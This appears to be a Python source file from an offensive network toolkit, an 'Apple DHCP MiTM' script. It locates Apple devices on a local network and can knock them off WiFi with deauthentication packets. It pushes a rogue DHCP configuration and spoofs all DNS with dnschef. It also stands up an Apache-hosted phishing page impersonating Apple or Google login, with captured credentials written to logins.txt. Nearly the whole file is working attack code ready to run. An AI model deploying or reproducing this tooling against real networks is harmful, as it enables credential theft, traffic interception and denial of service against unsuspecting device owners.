#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from scanner import Scanner
from os import path, errno, makedirs
from shutil import copyfile, copytree
import subprocess as sub
from argparse import ArgumentParser
from sys import exit
from time import sleep, time
from ipaddress import IPv4Address
import re
# endregion

# region Check user, platform and print banner
Base = Base()
Scanner = Scanner()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Apple DHCP MiTM script')
parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
parser.add_argument('-D', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                    help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                    help='Set local path to domain name for social engineering (default="apple")')
parser.add_argument('-k', '--kill', action='store_true', help='Kill all subprocesses')
parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
parser.add_argument('--deauth', action='store_true', help='Use wifi deauth technique for disconnect Apple device')
args = parser.parse_args()
# endregion

# region Kill subprocesses
sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"], shell=True)
sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2>/dev/null"], shell=True)

if args.kill:
    exit(0)

# Kill the processes that listens on 53 UDP port
sub.Popen(["kill -9 $(lsof -iUDP -n -P | grep ':53' | awk '{print $2}') 2>/dev/null"], shell=True)

# Kill the processes that listens on 80 TCP port
sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':80' | awk '{print $2}') 2>/dev/null"], shell=True)

# Kill the processes that listens on 443 TCP port
sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':443' | awk '{print $2}') 2>/dev/null"], shell=True)

# endregion

# region Set global variables
listen_network_interface = None
deauth_network_interface = None

apple_devices = []
apple_device = []
localnet_ip_addresses = []
ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
target_ip = None
new_ip = None

bssid = None
essid = None
channel = None
freq = None
# endregion

# region Get listen network interface, your IP address, first and last IP in local network
if args.listen_iface is None:
    Base.print_warning("Set network interface for listen ARP and DHCP requests:")
    listen_network_interface = Base.netiface_selection()
else:
    listen_network_interface = args.listen_iface

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

first_ip = Base.get_netiface_first_ip(listen_network_interface)
last_ip = Base.get_netiface_last_ip(listen_network_interface)
# endregion

# region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
if args.deauth_iface is not None:
    args.deauth = True

if args.deauth:
    # region Get network interface for send wifi deauth packets
    if args.deauth_iface is None:
        Base.print_warning("Set network interface for send wifi deauth packets:")
        deauth_network_interface = Base.netiface_selection()
    else:
        deauth_network_interface = args.deauth_iface

    if listen_network_interface == deauth_network_interface:
        Base.print_error("Network interface for listening DHCP requests (", listen_network_interface,
                         ") and network interface for send WiFi deauth packets must be differ!")
        exit(1)
    # endregion

    # region Get wifi settings from listen network interface
    try:
        iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        essid, essid_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        bssid, bssid_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        channel, channel_err = iwgetid.communicate()
        iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        freq, freq_err = iwgetid.communicate()

        essid = essid.rstrip()
        bssid = bssid.rstrip()
        channel = channel.rstrip()
        freq = freq.rstrip()

        if essid is None or essid == "":
            Base.print_error("Network interface: ", listen_network_interface, " is not connected to WiFi AP!")
            exit(1)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: iwgetid is not installed!")
            exit(1)
        else:
            Base.print_error("Something else went wrong while trying to run `iwgetid`")
            exit(2)
    # endregion

# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("First ip address: ", first_ip)
Base.print_info("Last ip address: ", last_ip)

if args.deauth:
    Base.print_info("Interface ", listen_network_interface, " connect to: ", essid + " (" + bssid + ")")
    Base.print_info("Interface ", listen_network_interface, " channel: ", channel)
    Base.print_info("Interface ", listen_network_interface, " frequency: ", freq)
    Base.print_info("Deauth network interface: ", deauth_network_interface)
# endregion

# region Check target IP and new IP addresses
if args.target_ip is not None:
    if ip_pattern.match(args.target_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
            target_ip = args.target_ip
            Base.print_info("Target IP address: ", target_ip)
        else:
            Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target IP address: ", args.target_ip)
        exit(1)

if args.new_ip is not None:
    if ip_pattern.match(args.new_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.new_ip)) <= IPv4Address(unicode(last_ip)):
            new_ip = args.new_ip
            Base.print_info("Target new IP address: ", new_ip)
        else:
            Base.print_error("Target new IP address: ", args.new_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target new IP address: ", args.new_ip)
        exit(1)
# endregion

# region Main function
if __name__ == "__main__":

    # region Set monitor mode on network interface for send wifi deauth packets
    if args.deauth:
        Base.print_info("Set Monitor mode on interface: ", deauth_network_interface, " ...")
        try:
            sub.Popen(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor >/dev/null 2>&1'],
                      shell=True, stdout=sub.PIPE)

            sleep(3)
            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface],
                                          shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            wireless_settings_out, wireless_settings_error = wireless_settings.communicate()

            if wireless_settings_out.find("Mode:Monitor") == -1:
                if wireless_settings_out.find("Mode:Auto") == -1:
                    Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
                    exit(1)

            sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
                      shell=True, stdout=sub.PIPE)
            sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: iwconfig or ifconfig is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run `iwconfig` or `ifconfig`")
                exit(2)
    # endregion

    # region Social engineering

    # region Disable ipv4 forwarding
    Base.print_info("Disable ipv4 forwarding")
    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
        ipv4_forward_file.write("0")
    # endregion

    # region Check OS installed software
    Base.print_info("Check OS installed software")
    Base.check_installed_software("apache2")
    Base.check_installed_software("service")
    Base.check_installed_software("dnschef")
    Base.check_installed_software("ps")
    # endregion

    # region Variables
    script_dir = project_root_path
    apache2_sites_available_dir = "/etc/apache2/sites-available/"
    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
    apache2_sites_path = "/var/www/html/"
    redirect_path = apache2_sites_path + "redirect/"
    # endregion

    # region Set phishing domain and path
    se_domain = args.phishing_domain
    if args.phishing_domain_path == "google" or args.phishing_domain_path == "apple":
        se_path = apache2_sites_path + args.phishing_domain_path
    else:
        se_path = args.phishing_domain_path

    Base.print_info("Phishing domain: ", se_domain)
    Base.print_info("Phishing domain local path: ", se_path)
    # endregion

    # region Directory for phishing domain
    if not path.exists(se_path):
        if args.phishing_domain_path == "google" or args.phishing_domain_path == "apple":
            copytree(src=project_root_path + "/Utils/Phishing_domains/" + args.phishing_domain_path, dst=se_path)
        else:
            Base.print_error("Directory: ", se_path, " does not exist!")
            exit(1)

    sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)
    # endregion

    # region Apache2 sites settings
    default_site_file_name = "000-default.conf"
    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
    default_site_file.write("<VirtualHost *:80>\n" +
                            "\tServerAdmin admin@apple.com\n" +
                            "\tRewriteEngine on\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
                            "\tDocumentRoot " + redirect_path + "\n" +
                            "\t<Directory " + redirect_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n\n" +
                            "<VirtualHost *:80>\n" +
                            "\tServerName " + se_domain + "\n" +
                            "\tServerAdmin admin@" + se_domain + "\n" +
                            "\tDocumentRoot " + se_path + "\n" +
                            "\t<Directory " + se_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n")
    default_site_file.close()

    # Create dir with redirect script
    try:
        makedirs(redirect_path)
    except OSError:
        Base.print_info("Path: ", redirect_path, " already exist")
    except:
        Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
        exit(1)

    # Copy and change redirect script
    redirect_script_name = "redirect.php"
    redirect_script_src = script_dir + "/Utils/" + redirect_script_name
    redirect_script_dst = redirect_path + redirect_script_name

    copyfile(src=redirect_script_src, dst=redirect_script_dst)

    # Read redirect script
    with open(redirect_script_dst, 'r') as redirect_script:
        content = redirect_script.read()

    # Replace the string
    content = content.replace('se_domain', se_domain)
    content = content.replace('se_path', se_path)

    # Write redirect script
    with open(redirect_script_dst, 'w') as redirect_script:
        redirect_script.write(content)

    try:
        Base.print_info("Restarting apache2 server ...")
        sub.Popen(['a2enmod rewrite  >/dev/null 2>&1'], shell=True)
        sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "service", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`service apache2 restart`")
            exit(2)
    # endregion

    # region Check apache2 is running
    sleep(2)
    apache2_pid = Base.get_process_pid("apache2")
    if apache2_pid == -1:
        Base.print_error("Process apache2 is not running!")
        exit(1)
    else:
        Base.print_info("Process apache2 is running, PID: ", str(apache2_pid))
    # endregion

    # region Dnschef settings
    Base.print_info("Start dnschef ...")
    try:
        sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
                   ' >' + script_dir + '/dnschef.log 2>&1 &'],
                  shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "dnschef", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something else went wrong while trying to run ", "`dnschef`")
            exit(2)
    # endregion

    # region Check dnschef is running
    sleep(2)
    dnschef_pid = Base.get_process_pid("dnschef")
    if dnschef_pid == -1:
        Base.print_error("Process dnschef is not running!")
        exit(1)
    else:
        Base.print_info("Process dnschef is running, PID: ", str(dnschef_pid))
    # endregion

    # endregion

    # region Find Apple devices in local network with arp-scan or nmap
    if args.target_ip is None:
        if not args.nmap_scan:
            Base.print_info("ARP scan is running ...")
            apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
        else:
            Base.print_info("NMAP scan is running ...")
            apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

        apple_device = Scanner.apple_device_selection(apple_devices)
    # endregion

    # region Find Mac address of Apple device if target IP is set
    if args.target_ip is not None:
        Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
        target_mac = Base.get_mac(listen_network_interface, target_ip)
        if target_mac == "ff:ff:ff:ff:ff:ff":
            Base.print_error("Could not find device MAC address with IP address: ", target_ip)
            exit(1)
        else:
            apple_device = [target_ip, target_mac]
    # endregion

    # region If apple devices are found

    if len(apple_device) > 0:
        # region Output target IP and MAC address
        target_ip_address = apple_device[0]
        target_mac_address = apple_device[1]
        Base.print_info("Target: ", target_ip_address + " (" + target_mac_address + ")")
        # endregion

        # region Set new IP address for target
        if not args.deauth:
            if args.new_ip is None:

                # region Fast scan localnet with arp-scan
                Base.print_info("Search for free IP addresses on the local network ...")
                localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
                # endregion

                index = 0
                while new_ip is None:
                    check_ip = str(IPv4Address(unicode(first_ip)) + index)
                    if check_ip not in localnet_ip_addresses:
                        new_ip = check_ip
                    else:
                        index += 1
                index = 0

            Base.print_info("Target new ip: ", new_ip)
        # endregion

        # region Run apple_rogue_dhcp and network_conflict_creator scripts
        if not args.deauth:
            try:
                sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' +
                           listen_network_interface + ' -t ' + target_mac_address +
                           ' -I ' + new_ip + ' -q &'],
                          shell=True)
                sleep(3)
                sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
                           listen_network_interface + ' -I ' + target_ip_address +
                           ' -t ' + target_mac_address + ' -q'], shell=True)
            except OSError as e:
                if e.errno == errno.ENOENT:
                    Base.print_error("Program: ", "python", " is not installed!")
                    exit(1)
                else:
                    Base.print_error("Something else went wrong while trying to run ",
                                     "`apple_rogue_dhcp.py`", " or ", "`network_conflict_creator.py`")
                    exit(2)
        # endregion

        # region Run dhcp_rogue_server script and aireply-ng for send deauth packets to Target
        if args.deauth:
            try:
                # Start dhcp_rogue_server.py script as process
                sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
                           listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
                           ' --dnsop --exit --quiet &'],
                          shell=True)
                sleep(3)

                # Send wifi deauth packets
                Base.print_info("WiFi deauth packets is sending ...")
                sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
                           ' >/dev/null 2>&1'], shell=True)
                Base.print_info("All WiFi deauth packets sent")

            except OSError as e:
                if e.errno == errno.ENOENT:
                    Base.print_error("Program: ", "python", " or ", "aireply-ng", " is not installed!")
                    exit(1)
                else:
                    Base.print_error("Something else went wrong while trying to run ",
                                     "`dhcp_rogue_server.py`", " or ", "`aireply-ng`")
                    exit(2)
        # endregion

        # region Check apple_rogue_dhcp or dhcp_rogue_server script is run
        if args.deauth:
            script_name = "dhcp_rogue_server"
        else:
            script_name = "apple_rogue_dhcp"

        rogue_server_pid = 0
        start = time()

        while Base.get_process_pid(script_name) != -1:

            # Get rogue server pid
            rogue_server_pid = Base.get_process_pid(script_name)

            # If timeout - kill rogue server process
            if int(time() - start) > 120:
                Base.kill_process(rogue_server_pid)

            # Wait
            sleep(10)

        # endregion

        # Exit from Main function
        exit(0)

    # endregion

# endregion
